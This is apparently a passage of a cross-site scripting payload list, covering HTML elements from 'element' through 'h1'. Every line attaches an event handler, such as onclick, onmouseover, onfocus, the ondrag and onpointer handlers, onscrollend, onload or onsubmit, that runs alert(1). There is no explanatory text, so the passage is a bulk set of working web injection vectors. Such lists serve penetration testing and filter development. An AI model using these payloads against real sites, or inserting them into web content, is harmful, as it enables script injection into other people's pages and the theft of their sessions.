<element onpointermove=alert(1) style=display:block>XSS</element>
<element onpointerout=alert(1) style=display:block>XSS</element>
<element onpointerover=alert(1) style=display:block>XSS</element>
<element onpointerrawupdate=alert(1) style=display:block>XSS</element>
<element onpointerup=alert(1) style=display:block>XSS</element>
<element onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></element>
<em contenteditable onbeforeinput=alert(1)>test
<em draggable="true" ondrag="alert(1)" style=display:block>test</em>
<em draggable="true" ondragend="alert(1)" style=display:block>test</em>
<em draggable="true" ondragenter="alert(1)" style=display:block>test</em>
<em draggable="true" ondragleave="alert(1)" style=display:block>test</em>
<em draggable="true" ondragstart="alert(1)" style=display:block>test</em>
<em id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></em>
<em id=x tabindex=1 onfocus=alert(1)></em>
<em id=x tabindex=1 onfocusin=alert(1)></em>
<em onafterscriptexecute=alert(1)><script>1</script>
<em onbeforecopy="alert(1)" contenteditable>test</em>
<em onbeforecut="alert(1)" contenteditable>test</em>
<em onbeforescriptexecute=alert(1)><script>1</script>
<em onblur=alert(1) id=x tabindex=1 style=display:block>test</em><input value=clickme>
<em onclick="alert(1)" style=display:block>test</em>
<em oncontextmenu="alert(1)" style=display:block>test</em>
<em oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<em oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<em ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</em>
<em onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</em><input value=clickme>
<em onkeydown="alert(1)" contenteditable style=display:block>test</em>
<em onkeypress="alert(1)" contenteditable style=display:block>test</em>
<em onkeyup="alert(1)" contenteditable style=display:block>test</em>
<em onmousedown="alert(1)" style=display:block>test</em>
<em onmouseenter="alert(1)" style=display:block>test</em>
<em onmouseleave="alert(1)" style=display:block>test</em>
<em onmousemove="alert(1)" style=display:block>test</em>
<em onmouseout="alert(1)" style=display:block>test</em>
<em onmouseover="alert(1)" style=display:block>test</em>
<em onmouseup="alert(1)" style=display:block>test</em>
<em onmousewheel=alert(1) style=display:block>requires scrolling
<em onpaste="alert(1)" contenteditable>test</em>
<em onpointerdown=alert(1) style=display:block>XSS</em>
<em onpointerenter=alert(1) style=display:block>XSS</em>
<em onpointerleave=alert(1) style=display:block>XSS</em>
<em onpointermove=alert(1) style=display:block>XSS</em>
<em onpointerout=alert(1) style=display:block>XSS</em>
<em onpointerover=alert(1) style=display:block>XSS</em>
<em onpointerrawupdate=alert(1) style=display:block>XSS</em>
<em onpointerup=alert(1) style=display:block>XSS</em>
<em onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></em>
<embed contenteditable onbeforeinput=alert(1)>test
<embed draggable="true" ondrag="alert(1)" style=display:block>test</embed>
<embed draggable="true" ondragend="alert(1)" style=display:block>test</embed>
<embed draggable="true" ondragenter="alert(1)" style=display:block>test</embed>
<embed draggable="true" ondragleave="alert(1)" style=display:block>test</embed>
<embed draggable="true" ondragstart="alert(1)" style=display:block>test</embed>
<embed id=x onfocus=alert(1) type=text/html>
<embed id=x onfocusin=alert(1) type=text/html>
<embed id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></embed>
<embed onafterscriptexecute=alert(1)><script>1</script>
<embed onbeforecopy="alert(1)" contenteditable>test</embed>
<embed onbeforecut="alert(1)" contenteditable>test</embed>
<embed onbeforescriptexecute=alert(1)><script>1</script>
<embed onblur=alert(1) id=x tabindex=1 style=display:block>test</embed><input value=clickme>
<embed onclick="alert(1)" style=display:block>test</embed>
<embed oncontextmenu="alert(1)" style=display:block>test</embed>
<embed oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<embed oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<embed ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</embed>
<embed onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</embed><input value=clickme>
<embed onkeydown="alert(1)" contenteditable style=display:block>test</embed>
<embed onkeypress="alert(1)" contenteditable style=display:block>test</embed>
<embed onkeyup="alert(1)" contenteditable style=display:block>test</embed>
<embed onmousedown="alert(1)" style=display:block>test</embed>
<embed onmouseenter="alert(1)" style=display:block>test</embed>
<embed onmouseleave="alert(1)" style=display:block>test</embed>
<embed onmousemove="alert(1)" style=display:block>test</embed>
<embed onmouseout="alert(1)" style=display:block>test</embed>
<embed onmouseover="alert(1)" style=display:block>test</embed>
<embed onmouseup="alert(1)" style=display:block>test</embed>
<embed onmousewheel=alert(1) style=display:block>requires scrolling
<embed onpaste="alert(1)" contenteditable>test</embed>
<embed onpointerdown=alert(1) style=display:block>XSS</embed>
<embed onpointerenter=alert(1) style=display:block>XSS</embed>
<embed onpointerleave=alert(1) style=display:block>XSS</embed>
<embed onpointermove=alert(1) style=display:block>XSS</embed>
<embed onpointerout=alert(1) style=display:block>XSS</embed>
<embed onpointerover=alert(1) style=display:block>XSS</embed>
<embed onpointerrawupdate=alert(1) style=display:block>XSS</embed>
<embed onpointerup=alert(1) style=display:block>XSS</embed>
<embed onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></embed>
<embed src=/ onload=alert(1)>
<embed src=1 onerror=alert(1) type=image/gif>
<fieldset contenteditable onbeforeinput=alert(1)>test
<fieldset draggable="true" ondrag="alert(1)" style=display:block>test</fieldset>
<fieldset draggable="true" ondragend="alert(1)" style=display:block>test</fieldset>
<fieldset draggable="true" ondragenter="alert(1)" style=display:block>test</fieldset>
<fieldset draggable="true" ondragleave="alert(1)" style=display:block>test</fieldset>
<fieldset draggable="true" ondragstart="alert(1)" style=display:block>test</fieldset>
<fieldset id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></fieldset>
<fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>
<fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>
<fieldset onafterscriptexecute=alert(1)><script>1</script>
<fieldset onbeforecopy="alert(1)" contenteditable>test</fieldset>
<fieldset onbeforecut="alert(1)" contenteditable>test</fieldset>
<fieldset onbeforescriptexecute=alert(1)><script>1</script>
<fieldset onblur=alert(1) id=x tabindex=1 style=display:block>test</fieldset><input value=clickme>
<fieldset onclick="alert(1)" style=display:block>test</fieldset>
<fieldset oncontextmenu="alert(1)" style=display:block>test</fieldset>
<fieldset oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<fieldset oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<fieldset ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</fieldset>
<fieldset onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</fieldset><input value=clickme>
<fieldset onkeydown="alert(1)" contenteditable style=display:block>test</fieldset>
<fieldset onkeypress="alert(1)" contenteditable style=display:block>test</fieldset>
<fieldset onkeyup="alert(1)" contenteditable style=display:block>test</fieldset>
<fieldset onmousedown="alert(1)" style=display:block>test</fieldset>
<fieldset onmouseenter="alert(1)" style=display:block>test</fieldset>
<fieldset onmouseleave="alert(1)" style=display:block>test</fieldset>
<fieldset onmousemove="alert(1)" style=display:block>test</fieldset>
<fieldset onmouseout="alert(1)" style=display:block>test</fieldset>
<fieldset onmouseover="alert(1)" style=display:block>test</fieldset>
<fieldset onmouseup="alert(1)" style=display:block>test</fieldset>
<fieldset onmousewheel=alert(1) style=display:block>requires scrolling
<fieldset onpaste="alert(1)" contenteditable>test</fieldset>
<fieldset onpointerdown=alert(1) style=display:block>XSS</fieldset>
<fieldset onpointerenter=alert(1) style=display:block>XSS</fieldset>
<fieldset onpointerleave=alert(1) style=display:block>XSS</fieldset>
<fieldset onpointermove=alert(1) style=display:block>XSS</fieldset>
<fieldset onpointerout=alert(1) style=display:block>XSS</fieldset>
<fieldset onpointerover=alert(1) style=display:block>XSS</fieldset>
<fieldset onpointerrawupdate=alert(1) style=display:block>XSS</fieldset>
<fieldset onpointerup=alert(1) style=display:block>XSS</fieldset>
<fieldset onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></fieldset>
<figcaption contenteditable onbeforeinput=alert(1)>test
<figcaption draggable="true" ondrag="alert(1)" style=display:block>test</figcaption>
<figcaption draggable="true" ondragend="alert(1)" style=display:block>test</figcaption>
<figcaption draggable="true" ondragenter="alert(1)" style=display:block>test</figcaption>
<figcaption draggable="true" ondragleave="alert(1)" style=display:block>test</figcaption>
<figcaption draggable="true" ondragstart="alert(1)" style=display:block>test</figcaption>
<figcaption id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></figcaption>
<figcaption id=x tabindex=1 onfocus=alert(1)></figcaption>
<figcaption id=x tabindex=1 onfocusin=alert(1)></figcaption>
<figcaption onafterscriptexecute=alert(1)><script>1</script>
<figcaption onbeforecopy="alert(1)" contenteditable>test</figcaption>
<figcaption onbeforecut="alert(1)" contenteditable>test</figcaption>
<figcaption onbeforescriptexecute=alert(1)><script>1</script>
<figcaption onblur=alert(1) id=x tabindex=1 style=display:block>test</figcaption><input value=clickme>
<figcaption onclick="alert(1)" style=display:block>test</figcaption>
<figcaption oncontextmenu="alert(1)" style=display:block>test</figcaption>
<figcaption oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<figcaption oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<figcaption ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</figcaption>
<figcaption onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</figcaption><input value=clickme>
<figcaption onkeydown="alert(1)" contenteditable style=display:block>test</figcaption>
<figcaption onkeypress="alert(1)" contenteditable style=display:block>test</figcaption>
<figcaption onkeyup="alert(1)" contenteditable style=display:block>test</figcaption>
<figcaption onmousedown="alert(1)" style=display:block>test</figcaption>
<figcaption onmouseenter="alert(1)" style=display:block>test</figcaption>
<figcaption onmouseleave="alert(1)" style=display:block>test</figcaption>
<figcaption onmousemove="alert(1)" style=display:block>test</figcaption>
<figcaption onmouseout="alert(1)" style=display:block>test</figcaption>
<figcaption onmouseover="alert(1)" style=display:block>test</figcaption>
<figcaption onmouseup="alert(1)" style=display:block>test</figcaption>
<figcaption onmousewheel=alert(1) style=display:block>requires scrolling
<figcaption onpaste="alert(1)" contenteditable>test</figcaption>
<figcaption onpointerdown=alert(1) style=display:block>XSS</figcaption>
<figcaption onpointerenter=alert(1) style=display:block>XSS</figcaption>
<figcaption onpointerleave=alert(1) style=display:block>XSS</figcaption>
<figcaption onpointermove=alert(1) style=display:block>XSS</figcaption>
<figcaption onpointerout=alert(1) style=display:block>XSS</figcaption>
<figcaption onpointerover=alert(1) style=display:block>XSS</figcaption>
<figcaption onpointerrawupdate=alert(1) style=display:block>XSS</figcaption>
<figcaption onpointerup=alert(1) style=display:block>XSS</figcaption>
<figcaption onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></figcaption>
<figure contenteditable onbeforeinput=alert(1)>test
<figure draggable="true" ondrag="alert(1)" style=display:block>test</figure>
<figure draggable="true" ondragend="alert(1)" style=display:block>test</figure>
<figure draggable="true" ondragenter="alert(1)" style=display:block>test</figure>
<figure draggable="true" ondragleave="alert(1)" style=display:block>test</figure>
<figure draggable="true" ondragstart="alert(1)" style=display:block>test</figure>
<figure id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></figure>
<figure id=x tabindex=1 onfocus=alert(1)></figure>
<figure id=x tabindex=1 onfocusin=alert(1)></figure>
<figure onafterscriptexecute=alert(1)><script>1</script>
<figure onbeforecopy="alert(1)" contenteditable>test</figure>
<figure onbeforecut="alert(1)" contenteditable>test</figure>
<figure onbeforescriptexecute=alert(1)><script>1</script>
<figure onblur=alert(1) id=x tabindex=1 style=display:block>test</figure><input value=clickme>
<figure onclick="alert(1)" style=display:block>test</figure>
<figure oncontextmenu="alert(1)" style=display:block>test</figure>
<figure oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<figure oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<figure ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</figure>
<figure onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</figure><input value=clickme>
<figure onkeydown="alert(1)" contenteditable style=display:block>test</figure>
<figure onkeypress="alert(1)" contenteditable style=display:block>test</figure>
<figure onkeyup="alert(1)" contenteditable style=display:block>test</figure>
<figure onmousedown="alert(1)" style=display:block>test</figure>
<figure onmouseenter="alert(1)" style=display:block>test</figure>
<figure onmouseleave="alert(1)" style=display:block>test</figure>
<figure onmousemove="alert(1)" style=display:block>test</figure>
<figure onmouseout="alert(1)" style=display:block>test</figure>
<figure onmouseover="alert(1)" style=display:block>test</figure>
<figure onmouseup="alert(1)" style=display:block>test</figure>
<figure onmousewheel=alert(1) style=display:block>requires scrolling
<figure onpaste="alert(1)" contenteditable>test</figure>
<figure onpointerdown=alert(1) style=display:block>XSS</figure>
<figure onpointerenter=alert(1) style=display:block>XSS</figure>
<figure onpointerleave=alert(1) style=display:block>XSS</figure>
<figure onpointermove=alert(1) style=display:block>XSS</figure>
<figure onpointerout=alert(1) style=display:block>XSS</figure>
<figure onpointerover=alert(1) style=display:block>XSS</figure>
<figure onpointerrawupdate=alert(1) style=display:block>XSS</figure>
<figure onpointerup=alert(1) style=display:block>XSS</figure>
<figure onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></figure>
<font contenteditable onbeforeinput=alert(1)>test
<font draggable="true" ondrag="alert(1)" style=display:block>test</font>
<font draggable="true" ondragend="alert(1)" style=display:block>test</font>
<font draggable="true" ondragenter="alert(1)" style=display:block>test</font>
<font draggable="true" ondragleave="alert(1)" style=display:block>test</font>
<font draggable="true" ondragstart="alert(1)" style=display:block>test</font>
<font id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></font>
<font id=x tabindex=1 onfocus=alert(1)></font>
<font id=x tabindex=1 onfocusin=alert(1)></font>
<font onafterscriptexecute=alert(1)><script>1</script>
<font onbeforecopy="alert(1)" contenteditable>test</font>
<font onbeforecut="alert(1)" contenteditable>test</font>
<font onbeforescriptexecute=alert(1)><script>1</script>
<font onblur=alert(1) id=x tabindex=1 style=display:block>test</font><input value=clickme>
<font onclick="alert(1)" style=display:block>test</font>
<font oncontextmenu="alert(1)" style=display:block>test</font>
<font oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<font oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<font ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</font>
<font onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</font><input value=clickme>
<font onkeydown="alert(1)" contenteditable style=display:block>test</font>
<font onkeypress="alert(1)" contenteditable style=display:block>test</font>
<font onkeyup="alert(1)" contenteditable style=display:block>test</font>
<font onmousedown="alert(1)" style=display:block>test</font>
<font onmouseenter="alert(1)" style=display:block>test</font>
<font onmouseleave="alert(1)" style=display:block>test</font>
<font onmousemove="alert(1)" style=display:block>test</font>
<font onmouseout="alert(1)" style=display:block>test</font>
<font onmouseover="alert(1)" style=display:block>test</font>
<font onmouseup="alert(1)" style=display:block>test</font>
<font onmousewheel=alert(1) style=display:block>requires scrolling
<font onpaste="alert(1)" contenteditable>test</font>
<font onpointerdown=alert(1) style=display:block>XSS</font>
<font onpointerenter=alert(1) style=display:block>XSS</font>
<font onpointerleave=alert(1) style=display:block>XSS</font>
<font onpointermove=alert(1) style=display:block>XSS</font>
<font onpointerout=alert(1) style=display:block>XSS</font>
<font onpointerover=alert(1) style=display:block>XSS</font>
<font onpointerrawupdate=alert(1) style=display:block>XSS</font>
<font onpointerup=alert(1) style=display:block>XSS</font>
<font onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></font>
<footer contenteditable onbeforeinput=alert(1)>test
<footer draggable="true" ondrag="alert(1)" style=display:block>test</footer>
<footer draggable="true" ondragend="alert(1)" style=display:block>test</footer>
<footer draggable="true" ondragenter="alert(1)" style=display:block>test</footer>
<footer draggable="true" ondragleave="alert(1)" style=display:block>test</footer>
<footer draggable="true" ondragstart="alert(1)" style=display:block>test</footer>
<footer id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></footer>
<footer id=x tabindex=1 onfocus=alert(1)></footer>
<footer id=x tabindex=1 onfocusin=alert(1)></footer>
<footer onafterscriptexecute=alert(1)><script>1</script>
<footer onbeforecopy="alert(1)" contenteditable>test</footer>
<footer onbeforecut="alert(1)" contenteditable>test</footer>
<footer onbeforescriptexecute=alert(1)><script>1</script>
<footer onblur=alert(1) id=x tabindex=1 style=display:block>test</footer><input value=clickme>
<footer onclick="alert(1)" style=display:block>test</footer>
<footer oncontextmenu="alert(1)" style=display:block>test</footer>
<footer oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<footer oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<footer ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</footer>
<footer onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</footer><input value=clickme>
<footer onkeydown="alert(1)" contenteditable style=display:block>test</footer>
<footer onkeypress="alert(1)" contenteditable style=display:block>test</footer>
<footer onkeyup="alert(1)" contenteditable style=display:block>test</footer>
<footer onmousedown="alert(1)" style=display:block>test</footer>
<footer onmouseenter="alert(1)" style=display:block>test</footer>
<footer onmouseleave="alert(1)" style=display:block>test</footer>
<footer onmousemove="alert(1)" style=display:block>test</footer>
<footer onmouseout="alert(1)" style=display:block>test</footer>
<footer onmouseover="alert(1)" style=display:block>test</footer>
<footer onmouseup="alert(1)" style=display:block>test</footer>
<footer onmousewheel=alert(1) style=display:block>requires scrolling
<footer onpaste="alert(1)" contenteditable>test</footer>
<footer onpointerdown=alert(1) style=display:block>XSS</footer>
<footer onpointerenter=alert(1) style=display:block>XSS</footer>
<footer onpointerleave=alert(1) style=display:block>XSS</footer>
<footer onpointermove=alert(1) style=display:block>XSS</footer>
<footer onpointerout=alert(1) style=display:block>XSS</footer>
<footer onpointerover=alert(1) style=display:block>XSS</footer>
<footer onpointerrawupdate=alert(1) style=display:block>XSS</footer>
<footer onpointerup=alert(1) style=display:block>XSS</footer>
<footer onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></footer>
<form contenteditable onbeforeinput=alert(1)>test
<form draggable="true" ondrag="alert(1)" style=display:block>test</form>
<form draggable="true" ondragend="alert(1)" style=display:block>test</form>
<form draggable="true" ondragenter="alert(1)" style=display:block>test</form>
<form draggable="true" ondragleave="alert(1)" style=display:block>test</form>
<form draggable="true" ondragstart="alert(1)" style=display:block>test</form>
<form id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></form>
<form id=x tabindex=1 onfocus=alert(1)></form>
<form id=x tabindex=1 onfocusin=alert(1)></form>
<form onafterscriptexecute=alert(1)><script>1</script>
<form onbeforecopy="alert(1)" contenteditable>test</form>
<form onbeforecut="alert(1)" contenteditable>test</form>
<form onbeforescriptexecute=alert(1)><script>1</script>
<form onblur=alert(1) id=x tabindex=1 style=display:block>test</form><input value=clickme>
<form onclick="alert(1)" style=display:block>test</form>
<form oncontextmenu="alert(1)" style=display:block>test</form>
<form oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<form oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<form ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</form>
<form onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</form><input value=clickme>
<form onkeydown="alert(1)" contenteditable style=display:block>test</form>
<form onkeypress="alert(1)" contenteditable style=display:block>test</form>
<form onkeyup="alert(1)" contenteditable style=display:block>test</form>
<form onmousedown="alert(1)" style=display:block>test</form>
<form onmouseenter="alert(1)" style=display:block>test</form>
<form onmouseleave="alert(1)" style=display:block>test</form>
<form onmousemove="alert(1)" style=display:block>test</form>
<form onmouseout="alert(1)" style=display:block>test</form>
<form onmouseover="alert(1)" style=display:block>test</form>
<form onmouseup="alert(1)" style=display:block>test</form>
<form onmousewheel=alert(1) style=display:block>requires scrolling
<form onpaste="alert(1)" contenteditable>test</form>
<form onpointerdown=alert(1) style=display:block>XSS</form>
<form onpointerenter=alert(1) style=display:block>XSS</form>
<form onpointerleave=alert(1) style=display:block>XSS</form>
<form onpointermove=alert(1) style=display:block>XSS</form>
<form onpointerout=alert(1) style=display:block>XSS</form>
<form onpointerover=alert(1) style=display:block>XSS</form>
<form onpointerrawupdate=alert(1) style=display:block>XSS</form>
<form onpointerup=alert(1) style=display:block>XSS</form>
<form onreset=alert(1)><input type=reset>
<form onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></form>
<form onsubmit=alert(1)><input type=submit>
<form><input oninvalid=alert(1) required><input type=submit>
<form><input type=search onsearch=alert(1) value="Hit return" autofocus>
<form><textarea oninvalid=alert(1) required><input type=submit>
<frame contenteditable onbeforeinput=alert(1)>test
<frame draggable="true" ondrag="alert(1)" style=display:block>test</frame>
<frame draggable="true" ondragend="alert(1)" style=display:block>test</frame>
<frame draggable="true" ondragenter="alert(1)" style=display:block>test</frame>
<frame draggable="true" ondragleave="alert(1)" style=display:block>test</frame>
<frame draggable="true" ondragstart="alert(1)" style=display:block>test</frame>
<frame id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></frame>
<frame onafterscriptexecute=alert(1)><script>1</script>
<frame onbeforecopy="alert(1)" contenteditable>test</frame>
<frame onbeforecut="alert(1)" contenteditable>test</frame>
<frame onbeforescriptexecute=alert(1)><script>1</script>
<frame onblur=alert(1) id=x tabindex=1 style=display:block>test</frame><input value=clickme>
<frame onclick="alert(1)" style=display:block>test</frame>
<frame oncontextmenu="alert(1)" style=display:block>test</frame>
<frame oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<frame oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<frame ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</frame>
<frame onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</frame><input value=clickme>
<frame onkeydown="alert(1)" contenteditable style=display:block>test</frame>
<frame onkeypress="alert(1)" contenteditable style=display:block>test</frame>
<frame onkeyup="alert(1)" contenteditable style=display:block>test</frame>
<frame onmousedown="alert(1)" style=display:block>test</frame>
<frame onmouseenter="alert(1)" style=display:block>test</frame>
<frame onmouseleave="alert(1)" style=display:block>test</frame>
<frame onmousemove="alert(1)" style=display:block>test</frame>
<frame onmouseout="alert(1)" style=display:block>test</frame>
<frame onmouseover="alert(1)" style=display:block>test</frame>
<frame onmouseup="alert(1)" style=display:block>test</frame>
<frame onmousewheel=alert(1) style=display:block>requires scrolling
<frame onpaste="alert(1)" contenteditable>test</frame>
<frame onpointerdown=alert(1) style=display:block>XSS</frame>
<frame onpointerenter=alert(1) style=display:block>XSS</frame>
<frame onpointerleave=alert(1) style=display:block>XSS</frame>
<frame onpointermove=alert(1) style=display:block>XSS</frame>
<frame onpointerout=alert(1) style=display:block>XSS</frame>
<frame onpointerover=alert(1) style=display:block>XSS</frame>
<frame onpointerrawupdate=alert(1) style=display:block>XSS</frame>
<frame onpointerup=alert(1) style=display:block>XSS</frame>
<frame onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></frame>
<frameset contenteditable onbeforeinput=alert(1)>test
<frameset draggable="true" ondrag="alert(1)" style=display:block>test</frameset>
<frameset draggable="true" ondragend="alert(1)" style=display:block>test</frameset>
<frameset draggable="true" ondragenter="alert(1)" style=display:block>test</frameset>
<frameset draggable="true" ondragleave="alert(1)" style=display:block>test</frameset>
<frameset draggable="true" ondragstart="alert(1)" style=display:block>test</frameset>
<frameset id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></frameset>
<frameset id=x tabindex=1 onfocus=alert(1)></frameset>
<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>
<frameset onafterscriptexecute=alert(1)><script>1</script>
<frameset onbeforecopy="alert(1)" contenteditable>test</frameset>
<frameset onbeforecut="alert(1)" contenteditable>test</frameset>
<frameset onbeforescriptexecute=alert(1)><script>1</script>
<frameset onblur=alert(1) id=x tabindex=1 style=display:block>test</frameset><input value=clickme>
<frameset onclick="alert(1)" style=display:block>test</frameset>
<frameset oncontextmenu="alert(1)" style=display:block>test</frameset>
<frameset oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<frameset oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<frameset ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</frameset>
<frameset onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</frameset><input value=clickme>
<frameset onkeydown="alert(1)" contenteditable style=display:block>test</frameset>
<frameset onkeypress="alert(1)" contenteditable style=display:block>test</frameset>
<frameset onkeyup="alert(1)" contenteditable style=display:block>test</frameset>
<frameset onmousedown="alert(1)" style=display:block>test</frameset>
<frameset onmouseenter="alert(1)" style=display:block>test</frameset>
<frameset onmouseleave="alert(1)" style=display:block>test</frameset>
<frameset onmousemove="alert(1)" style=display:block>test</frameset>
<frameset onmouseout="alert(1)" style=display:block>test</frameset>
<frameset onmouseover="alert(1)" style=display:block>test</frameset>
<frameset onmouseup="alert(1)" style=display:block>test</frameset>
<frameset onmousewheel=alert(1) style=display:block>requires scrolling
<frameset onpageshow=alert(1)>
<frameset onpaste="alert(1)" contenteditable>test</frameset>
<frameset onpointerdown=alert(1) style=display:block>XSS</frameset>
<frameset onpointerenter=alert(1) style=display:block>XSS</frameset>
<frameset onpointerleave=alert(1) style=display:block>XSS</frameset>
<frameset onpointermove=alert(1) style=display:block>XSS</frameset>
<frameset onpointerout=alert(1) style=display:block>XSS</frameset>
<frameset onpointerover=alert(1) style=display:block>XSS</frameset>
<frameset onpointerrawupdate=alert(1) style=display:block>XSS</frameset>
<frameset onpointerup=alert(1) style=display:block>XSS</frameset>
<frameset onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></frameset>
<frameset><frame id=x onfocus=alert(1)>
<frameset><frame id=x onfocusin=alert(1)>
<frameset><frame onload=alert(1)>
<h1 contenteditable onbeforeinput=alert(1)>test
<h1 draggable="true" ondrag="alert(1)" style=display:block>test</h1>
<h1 draggable="true" ondragend="alert(1)" style=display:block>test</h1>
<h1 draggable="true" ondragenter="alert(1)" style=display:block>test</h1>
<h1 draggable="true" ondragleave="alert(1)" style=display:block>test</h1>
<h1 draggable="true" ondragstart="alert(1)" style=display:block>test</h1>
<h1 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></h1>
<h1 id=x tabindex=1 onfocus=alert(1)></h1>
<h1 id=x tabindex=1 onfocusin=alert(1)></h1>
<h1 onafterscriptexecute=alert(1)><script>1</script>
<h1 onbeforecopy="alert(1)" contenteditable>test</h1>
<h1 onbeforecut="alert(1)" contenteditable>test</h1>
<h1 onbeforescriptexecute=alert(1)><script>1</script>
<h1 onblur=alert(1) id=x tabindex=1 style=display:block>test</h1><input value=clickme>
<h1 onclick="alert(1)" style=display:block>test</h1>
<h1 oncontextmenu="alert(1)" style=display:block>test</h1>
<h1 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<h1 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<h1 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</h1>
<h1 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</h1><input value=clickme>
<h1 onkeydown="alert(1)" contenteditable style=display:block>test</h1>
<h1 onkeypress="alert(1)" contenteditable style=display:block>test</h1>
<h1 onkeyup="alert(1)" contenteditable style=display:block>test</h1>
<h1 onmousedown="alert(1)" style=display:block>test</h1>
<h1 onmouseenter="alert(1)" style=display:block>test</h1>
<h1 onmouseleave="alert(1)" style=display:block>test</h1>
<h1 onmousemove="alert(1)" style=display:block>test</h1>
<h1 onmouseout="alert(1)" style=display:block>test</h1>
<h1 onmouseover="alert(1)" style=display:block>test</h1>
